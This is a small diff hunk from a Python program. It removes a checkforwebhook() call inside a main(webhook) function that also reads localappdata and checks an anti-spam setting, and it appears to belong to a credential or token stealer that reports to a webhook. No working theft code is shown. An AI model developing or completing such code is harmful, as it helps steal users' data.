@@ -50,7 +50,6 @@ localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-    checkforwebhook()
 
     if __CONFIG__["anti_spam"]:
         AntiSpam()
